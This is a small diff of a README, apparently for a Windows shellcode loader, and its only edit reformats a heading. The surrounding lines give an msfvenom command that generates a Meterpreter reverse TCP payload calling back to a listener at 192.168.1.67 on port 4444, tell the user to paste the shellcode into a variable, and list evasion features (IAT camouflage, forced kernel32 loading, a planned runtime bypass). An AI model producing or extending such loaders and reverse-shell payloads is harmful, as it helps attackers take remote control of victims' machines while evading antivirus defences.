@@ -4,7 +4,7 @@
 `msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe`
 2. Put your shellcode in the `wannabe` variable.
 
-##UPDATES 
+### UPDATES 
 - Added IAT camouflage
 - Added Force loading kernel32.dll
 - More to come.. need to bypass runtime...
